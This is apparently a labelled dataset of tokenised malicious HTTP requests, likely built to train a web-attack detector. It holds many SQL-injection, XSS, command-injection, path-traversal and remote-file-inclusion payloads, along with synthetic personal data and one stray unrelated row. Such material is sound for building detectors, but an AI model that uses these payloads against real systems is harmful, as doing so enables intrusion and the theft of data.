sentences 	 labels
/ string & b2 =  |  	 1
/ string & strings & parameters = 1 %  '  )  )  union all select null , null , null , null , null , null #  	 1
/ string & strings & parameters = ;  str =  $  ( echo ewygbo )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  &  	 1
/ g3w7y7u5 . html ?  < script > document . cookie =  " testbfpq = 3326 ;  "  <  ?  < script > document . cookie =  " testbfpq = 3326 ;  "  <  / script >  	 1
/ string & strings & parameters = <  & svg : mask >  	 1
/ vwmg565s . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & modo = registro & login = tiong-ho & password = an1l5m9no & nombre = hadasa & apellidos = subias & email = parada . biuchet4 @ aulahost . gw & dni = 79845869n & direccion = jacinto + benavente ,  + 165 + 7f & ciudad = herreruela & cp = 11330 & provincia = teruel & ntc = any  set-cookie :  + tamper = 5765205567234876235 & b1 = registrar  	 1
/ 169okeyj . php ?  < meta http-equiv = set-cookie content =  " testxeoi = 3573 "  >?  < meta http-equiv = set-cookie content =  " testxeoi = 3573 "  >  	 1
/ string & strings & parameters = 1 '  +  ( select ggah where 3263 = 3263 and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  )  +  '  	 1
/ vhzmaia2 . fts ?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >  	 1
/ cgi-bin &  ? user = jffnms_user_sql_injection . nasl '  union select 2 ,  ' admin '  ,  '  $ 1 $ rxs1rotx $ iza1s3fccfyvfa9rwkbmi .  '  ,  ' administrator '  --  & file = index & pass =  	 1
/ string & strings & parameters = % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo jicoqs )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  	 1
/ scripts ? username =  "  < script > foo <  ? username =  "  < script > foo <  / script  	 1
/ string & strings & parameters = '  ;  str =  $  ( echo zahuzd )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 1
/ string & strings & parameters = ;  str =  $  ( echo gzpdpd )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 1
/ javascript & search . exe  	 1
/ top . php ? stuff =  "  \ x0auname \ x09 > q69986769 \ x09 #? stuff =  "  \ x0auname \ x09 > q69986769 \ x09 #  	 1
/ string & modo = entrar & login = barde8 & pwd = ensueo & remember = off &  & b1 = entrar  	 1
/ string & strings & parameters = '  echo dootql $  (  ( 40 + 84 )  )  $  ( echo dootql ) dootql &  	 1
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  \  { file }  	 1
/ scripts & index . phtml ? mode = view & album =  ` id `  & pic = a = 10 . jpg & dispsize = 640 & start = 0  	 1
/ string & strings & parameters = |  | echo csdayb $  (  ( 1 + 92 )  )  $  ( echo csdayb ) csdayb '  	 1
/ examples & jsp & jsp2 & el & includes & converter . inc . php ? include_path =  / etc / passwd \ x00  	 1
/ help . php ? q =  "  \ x0auname  > q51358327  #? q =  "  \ x0auname  > q51358327  #  	 1
/ examples & jsp & jsp2 & jspx & calendar_admin . pl ? config =  | cat  / etc / passwd |  	 1
/ string & modo = registro & login = shonuck & password = 9r3h7la8 & nombre = hortencia & apellidos = ma + moscoso & email = valadez @ gaudio . bj & dni = 81703579n & direccion = poligono + amargacena + 141 +  & ciudad = hita & cp = 06658 & provincia = barcelona & ntc = 7343251905864691 & b1 =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 1
/ string & strings & parameters = "  ; echo beqetv $  (  ( 73 + 10 )  )  $  ( echo beqetv ) beqetv "  	 1
/ examples & jsp & jsp2 & el & styles . php ? toroot =  / etc / passwd \ x00  	 1
/ cacti & home & search . asp ? nchannel =  ' 1  	 1
/ string & strings & parameters = 1 and  ( 3020 = 3020 )  * 6703 --  zsnl  	 1
/ string & strings & parameters = &  ping -i 30 127 . 0 . 0 . 1  &  	 1
/ examples & jsp & sessions & hw3 . cgi ? daysonly = 0 )  . system (  ' id '  )  .  (  	 1
/ examples & jsp & cal & store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 1
/  ?  < script > document . cookie =  " testcrcv = 6167 ;  "  <  ?  < script > document . cookie =  " testcrcv = 6167 ;  "  <  / script >  	 1
/ string & modo = registro & login = jeanloui & password = any ?   set-cookie :  + tamper = 1041264011025374727 & nombre = evelio & apellidos = fonfria + castillero & email = sprerris-apfel @ tresbrujas . bn & dni = 89061921x & direccion = c /  + cervantes + 117 ,  + 10 ? g & ciudad = rbel + del + castillo & cp = 50343 & provincia = palencia & ntc = 9895940721818753 & b1 = registrar  	 1
/ examples & jsp & error &  ? mod = read & id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = . 0  	 1
/ string & strings & parameters = 1 %  '  and 9660 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 1
/ examples & jsp & jsp2 & el & file . cgi ? name =  / eventcache /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 1
/ script & plugins & phpgacl & admin & index . php ? path_inc = xxpathxx  	 1
/ string & strings & parameters = 1 '  )  )  ; create or replace function sleep ( int )  returns int as  '  & lib & libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  and  (  (  ' mmvf '  like  ' mmvf  	 1
/ string & modo = insertar & precio = 201 & b1 = pasar + por + caja &  	 1
/ 9o6g5vkn . asp ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ cacti & catalog . php ? action = category_show & id =  '  	 1
/ string & strings & parameters = $  { system ( print (  ` echo ddvdpm echo  $  (  ( 1 + 17 )  )  echo ddvdpm echo ddvdpm `  )  ;  )  } ddvdpm  	 1
/ string & strings & parameters = '  |   [  3 -ne  $  ( echo idqlww  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  &  	 1
/ string & strings & parameters = 1 )  as jvmv where 3857 = 3857 and  ( 5717 = 6483 )  * 6483 --  	 1
/ string & strings & parameters = |  | echo yzmmii $  (  ( 39 + 60 )  )  $  ( echo yzmmii ) yzmmii "  	 1
/ string & modo = registro & login = munaz & password = s2ld54i5a & nombre = zulma & apellidos = llombart & email = strimpell @ deuxmanagement . sn & dni = 54841138fbob @  < script > alert ( paros )  <  & script >  . parosproxy . org & direccion = sofia ,  + 60 ,  + 3 ? b & ciudad = finestrat & cp = 01427 & provincia = granada & ntc = 3222655347075896 & b1 = registrar  	 1
/ string & strings & parameters = '  | echo $ ifspzxchl $  (  ( 23 + 27 )  )  $  ( echo $ ifspzxchl ) pzxchl "  	 1
/ javascript & fuckoff . exe  	 1
/ string & strings & parameters = -5496 union all select 2099 , 2099 , 2099 #  	 1
/ string & strings & parameters = 1 '  )  )  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  (  (  ' glfq '  like  ' glfq  	 1
/ options . php ? optpage =  < script > alert (  ' vulnerable !  '  )  <  ? optpage =  < script > alert (  ' vulnerable !  '  )  <  / script >  	 1
/ string & strings & parameters = < iframe srcdoc =  '  & lt ; body onload = prompt & lpar ; 1 & rpar ;  & gt ;  '  >  	 1
/  ,  % env ,  &  	 1
/ string & strings & parameters = 1 %  '  )  ; select sleep ( 5 )  #  	 1
/ string & strings & parameters = "  &  sleep 0  &  &  str =  $  ( echo bkaifj )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  &  &  	 1
/ string & strings & parameters = 1 %  '  )  )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  --  	 1
/ string & strings & parameters = |   [  5 -ne  $  ( echo kbohvq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 1
/ string & strings & parameters = "  ; alert ( 123 )  ; t =  "  	 1
/ index . php & content & search &  ? sectionid = 3 & searchtext =  < script > alert ( document . cookie )  <  / script >  	 1
/ main . php ? logout =  "  \ x0ddel \ x09q59885581 \ x09 #? logout =  "  \ x0ddel \ x09q59885581 \ x09 #  	 1
/ includes & mkb . php ? phpbb_root_path = xxpathxx ? ls  	 1
/ ghswfouu . pl ?  < meta http-equiv = set-cookie content =  " testsqmm = 5713 "  >?  < meta http-equiv = set-cookie content =  " testsqmm = 5713 "  >  	 1
/ cacti & index . php ? id =  '  	 1
/ examples & jsp & sessions & wikka . php ? wakka = homepage /  .  .  /  .  .  / actions / wikkachanges  	 1
/ string & strings & parameters = 1 "  "  or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  and  "  " gknn "  "  like  "  " gknn  	 1
/ help . php ? q =  "  & ping -w 7000 -n 1 4 . 3 . 2 . 1 & rem? q =  "  & ping -w 7000 -n 1 4 . 3 . 2 . 1 & rem  	 1
/ string & modo = insertar & precio = any ?   set-cookie :  + tamper = 1041264011025374727 & b1 = pasar + por + caja  	 1
/ 3j8echh0 . jspa ?  < meta http-equiv = set-cookie content =  " testfuqi = 4189 "  >?  < meta http-equiv = set-cookie content =  " testfuqi = 4189 "  >  	 1
/ string & strings & parameters = '  )  )  and 0 = benchmark ( 3000000 , md5 ( 1 )  )   &  *  	 1
/ string & modo = registro & login = dido & password = enmarch3tar & nombre = bertilda & apellidosa = deverdun & email = low . feliciano @ azkara . sj & dni = 19110618x & direccion = prolongacion + algeciras + 169 ,  +  & ciudad = navarredonda + de + gredos & cp = 18418 & provincia = navarra & ntc = 1628195660765454 & b1 = registrar  	 1
/ recordings & apps & pbcs . dll & misc ? url =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 1
/ examples & jsp & error & profil . php ? id = 1  < script > foo <  / script >  	 1
/ o1zj4u9v . nsf ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo hvspqm )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ string & strings & parameters = 1 "  "  )  where 8612 = 8612 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 1
/ string & strings & parameters = 1 "  "  )  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  (  "  " zili "  "  like  "  " zili  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 1
/ string & strings & parameters = `  & usr & bin & id `  	 1
/ string & strings & parameters = ;  str =  $  ( echo pohuxh )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  	 1
/ string & strings & parameters = ;  str =  $  ( echo tgjacn )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ t578vqea . idc ?  < script > document . cookie =  " testsory = 7676 ;  "  <  ?  < script > document . cookie =  " testsory = 7676 ;  "  <  / script >  	 1
/ top . php ? stuff =  ; uname  > q54934318  #? stuff =  ; uname  > q54934318  #  	 1
/ string & strings & parameters = 1 '  where 4039 = 4039 union all select null , null , null , null , null , null , null , null --  	 1
/ nuh3zirz . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & modo = registro & login = nafsika & password = malhecho & nombre = jesumina & apellidos = -p-ia , na & email = cottrell @ muchochinoenchina . tg & dni = 44709161j & direccion = navaluenga ,  + 120 + 11 ? a & ciudad = orsoain & cp = 21840 & provincia = cuenca & ntc = 4344385269362154 & b1 = registrar  	 1
/ string & strings & parameters = 1 %  "  "  )  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ a0imiuf1 . htm ?  < script > document . cookie =  " testxqrn = 4654 ;  "  <  ?  < script > document . cookie =  " testxqrn = 4654 ;  "  <  / script >  	 1
/ string & strings & parameters = "  "  <  & comment >  < img src = x onerror = alert ( 1 )  &  &  "  "  >  	 1
/ string & strings & parameters = 1 "  "  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  "  " ccuy "  "  =  "  " ccuy  	 1
/ string & strings & parameters = �? or 1 = 1  --  	 1
/ string & strings & parameters = -1 < style >  <  !  --  <  & style >  < script > document . cookie = true ;  &  &  --  >  <  & script >  	 1
/ string & strings & parameters = 1 )  and  ( 7557 = 1711 )  * 1711 and  ( 5157 = 5157  	 1
/ string & strings & parameters = 1 %  '  )  union all select null , null , null --  	 1
/ 6qbynt4f . asp ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = echo gbxopj $  (  ( 13 + 32 )  )  $  ( echo gbxopj ) gbxopj  	 1
/ string & strings & parameters = -6514 )  )  as pbgg where 6841 = 6841 union all select 6841 , 6841 , 6841 , 6841 --  	 1
/ string & strings & parameters = -7379 union all select 9813 , 9813 , 9813 , 9813 , 9813 , 9813 , 9813 , 9813 --  	 1
/ 0rufe52p . pl ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = 1 %  "  "  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  "  "  %  "  "  =  "  "  	 1
/ string & strings & parameters = 1 %  "  "  )  ; if ( 9953 = 4347 )  select 9953 else drop function ocau --  	 1
/ string & modo = registro & login = teriann & password = bim42or & nombre = archibaldo & apellidos =  , arbiol + farren . y & email = seidler . pedro @ investopi . bt & dni = 69492946x & direccion = c &  + isabel + ii + 151 ,  + 2b & ciudad = vilamalla & cp = 09450 & provincia = zamora & ntc = 6106115865632521 & b1 = registrar  	 1
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331905034 & lang_crm =  .  .  ? module = vtiger_lang_crm_lfi . nasl & action = 1331905034 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  	 1
/ main . php ? stuff =  '  \ x0dsleep 9  #? stuff =  '  \ x0dsleep 9  #  	 1
/ string & strings & parameters = 1 where 9072 = 9072 and elt ( 4249 = 4249 , 7259 )  --  	 1
/ string & strings & parameters = union  &  *  ! select *  &   &  *  !  @  @ datadir *  &  	 1
/ string & str =  $  ( echo fufpkn )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  &  	 1
/ main . php ? logout =  "  & ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;? logout =  "  & ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  	 1
/ string & strings & parameters = ;  str =  $  ( echo knetda )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 1
/ string & strings & parameters = < a href =  " javascript : name "  > click <  & a >  	 1
/ string & strings & parameters = "  |   [  9 -ne  $  ( echo jlfvec  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  &  	 1
/ string & strings & parameters = -1332 )  as qtbb where 7261 = 7261 or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  #  	 1
/ examples & jsp & colors & shopper . cgi ? newpage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ db & polldb . php ? config_datareaderwriter = xxpathxx ?  	 1
/ 7o5qp766 . php ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = ; echo jyxfus $  (  ( 22 + 98 )  )  $  ( echo jyxfus ) jyxfus &  	 1
/ string & strings & parameters = 1 ; select benchmark ( 5000000 , md5 ( 0x4c4d6142 )  )  #  idxq  	 1
/ string & strings & parameters = 1 '  ,  ( select  ( case when  ( 8640 = 8640 )  then  ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 )  , 0 )  , 500000000 )  , null )  )  )  else 8640 &  ( select 0 from information_schema . system_users )  end )  from information_schema . system_users )  --  	 1
/ en-us & 33y9gcqq . html ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  	 1
/ string & strings & parameters = 1 union all select null , null , null , null , null , null , null , null , null --  	 1
/ awstats & awstats . pl ? migrate =  | echo ;  /  .  / tmp / xmefwyizyj0  >   / dev / null  &  ; echo | awstats852068 . txt  	 1
/ string & modo = entrar & login = any set-cookie :  + tamper = 1041264011025374727 & pwd = 2anc580a95r & remember = off & b1 = entrar  	 1
/ phptonuke . php ? filnavn =  ? filnavn =  / etc / passwd  	 1
/ script & index . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  	 1
/ esmozg5d . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ examples & jsp & security & protected & is_cgi_installed3_ . j_security_check ; jsessionid = 5680ad1b9956cf0a8a9f08a20f983ee61893221447 . swp  	 1
/ main . php ? logout =  " ver & rem \ xa0? logout =  " ver & rem \ xa0  	 1
/ string & strings & parameters = |   [  9 -ne  $  ( echo mclzrv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ string & strings & parameters = -3347 '  +  ( select xuzs where 1076 = 1076 union all select 1076 , 1076 , 1076 , 1076 , 1076 --  	 1
/ sources & functions . php ? root_path =  / etc / passwd \ x00  	 1
/ examples & jsp & checkbox & forumdisplay . php ? fid = 21 "  >  < script > x <  / script >  	 1
/ string & strings & parameters = " echo $ ifswkativ $  (  ( 60 + 61 )  )  $  ( echo $ ifswkativ ) wkativ  	 1
/ help . php ? q =  "  & rm q34212187  #? q =  "  & rm q34212187  #  	 1
/ awstats & awstats . pl ? migrate =  | echo ; chmod 555  / tmp / gjehhrjnrx0 ; echo | awstats679107 . txt  	 1
/ string & strings & parameters = echo ghwfxg $  (  ( 12 + 72 )  )  $  ( echo ghwfxg ) ghwfxg "  	 1
/ string & strings & parameters = http :  &  & www . google < script  . com > alert ( document . location )  <  & script  	 1
/ string & id = 3 & nombre = queso + manchego & precio = 39 &  & cantidad = 57 & b1 = aadir + al + carrito  	 1
/ string & modo = entrar & login = kilner & pwd = gurbia & remember =  ' or ' a =  ' a & b1 = entrar  	 1
/ cgi-bin & yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ comments . php ? scriptpath = http :  ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / no4ghqiguzhst ?  ?  	 1
/ index . php ?  "  >  < script > alert ( 411775577573 )  <  ?  "  >  < script > alert ( 411775577573 )  <  / script >  	 1
/ string & strings & parameters = 1 '  rlike  ( select  ( case when  ( 5384 = 7060 )  then 1 else 0x28 end )  )  	 1
/ main . php ? logout =  " ping ; -w ; 10000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;? logout =  " ping ; -w ; 10000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;  	 1
/ string & strings & parameters = 1 '  |  |  ( select  ' vuku '  where 3143 = 3143 waitfor delay  ' 0 : 0 : 5 '  --  	 1
/ string & modoa = registro & login = beth & password = romanizar & nombre = numa & apellidos = villalta + tapasco & email = modica @ boda-barata . kw & dni = 35697894p & direccion = masia + can + pere + riera + petit + 14 ,  +  & ciudad = xove & cp = 05560 & provincia = cantabria & ntc = 3116780523679392 & b1 = registrar  	 1
/  &  .  .  &  .  .  &  .  .  &  .  .  &  .  .  &  .  .  &  .  .  &  .  .  & windows & win . ini  	 1
/ string & strings & parameters = -7395 %  "  "  order by 1 --  	 1
/ string & strings & parameters = 1 '  ; select  ( case when  ( 7990 = 7627 )  then 7990 else 1 &  ( select 0 )  end )  --  	 1
/ help . php ? q =  "  | ping \ x0c-w \ x0c8000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c? q =  "  | ping \ x0c-w \ x0c8000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c  	 1
/ string & str =  $  ( echo eigkoy )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  &  	 1
/ examples & jsp & sessions & index . php ? act = arcade & do = stats & gameid = 1 '  	 1
/ yver8r9o . pl ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & modo = entrar & login = margalo & pwd = distilatorio & remember = off &  & b1 = entrar  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo hsrgrg )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ string & strings & parameters = 1 "  "  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  "  " wcze "  "  =  "  " wcze  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo fkfulk )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 1
/ string & strings & parameters = 1 and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  )  #  igen  	 1
/ string & modo = entrar & login = pagi & pwd = cal ,  , 8 , ndar & remember = off & b1 = entrar  	 1
/ string & strings & parameters = &  & echo $ ifswaewha $  (  ( 84 + 51 )  )  $  ( echo $ ifswaewha ) waewha '  	 1
/ daddy ' s little princess - sasha knox &  	 1
/ main . php ? stuff =  '  \ x0adel q61656815  #? stuff =  '  \ x0adel q61656815  #  	 1
/ scripts & adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  /  	 1
/ javascript & boot . exe  	 1
/ string & modo = entrar & login = wilken & pwd = r5pa2el0s & remember = off &  & b1 = entrar  	 1
/ addvip . php ? msetstr [  " progsdir "  ]  = http :  ? msetstr [  " progsdir "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ?  	 1
/ h4bi26jd . nsf ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  / script >  	 1
/ x7pclv4s . html ?  < meta http-equiv = set-cookie content =  " testiulz = 3709 "  >?  < meta http-equiv = set-cookie content =  " testiulz = 3709 "  >  	 1
/ javascript & body . exe  	 1
/ string & strings & parameters = -5043 %  '  )  )  )  union all select 5860 , 5860 , 5860 , 5860 , 5860 #  	 1
/ bin & cgi-test . exe  	 1
/ string & strings & parameters = "  |   [  4 -ne  $  ( echo mnlbvu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ script_path & cms & classes & openengine & filepool . php ? oe_classpath = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  	 1
/ webcgi & r . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = %  '  }  )  ;  alert ( 1 )  ;   &  &  	 1
/ javascript & message . exe  	 1
/ examples & jsp & colors & store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 1
/ string & strings & parameters = 1 '  |  |  ( select  ' ersu '  where 4123 = 4123 and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  --  	 1
/ help . php ? q =  " ping ; -w ; 11000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;? q =  " ping ; -w ; 11000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  	 1
/ shop & normal_html . cgi ? file =  ; cat  / etc / passwd |  	 1
/ string & strings & parameters = < link href =  " http :  &  & host & xss . css "  >  	 1
/ examples & jsp & checkbox & sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 "  "  )  where 8953 = 8953 or 5356 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  	 1
/ biblioteca & sog_save . php ? classpath = xxpathxx  	 1
/ manager & search =  < script > alert (  ' xss '  )  <  & script >  	 1
/ string & strings & parameters = -2912 '  )  )  order by 1 --  	 1
/ string & strings & parameters = "  &  >  < isindex action =  " javas & tab ; cript : confirm ( 1 )  "  type = image >  	 1
/ string & strings & parameters = |   [  6 -ne  $  ( echo wigalp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ main . php ? stuff =  '  \ x0duname  > q65565224  #? stuff =  '  \ x0duname  > q65565224  #  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo bfmcie )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 1
/ string & strings & parameters = & echo ogaqad $  (  ( 97 + 22 )  )  $  ( echo ogaqad ) ogaqad &  	 1
/ javascript & document . bin  	 1
/ top . php ? stuff = ping ; -w ; 10000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;? stuff = ping ; -w ; 10000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;  	 1
/ cgi-bin & csnewspro . cgi ? command = savesetup & setup =  ; system (  ' cat  / etc / passwd '  )  	 1
/ string & strings & parameters = ;  str =  $  ( echo vhbjgh )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ string & str =  $  ( echo nwelwc )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 1
/ evb & check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1332010400 , 256728797  --  	 1
/ string & strings & parameters = 1 and make_set ( 6911 = 1867 , 1867 )  	 1
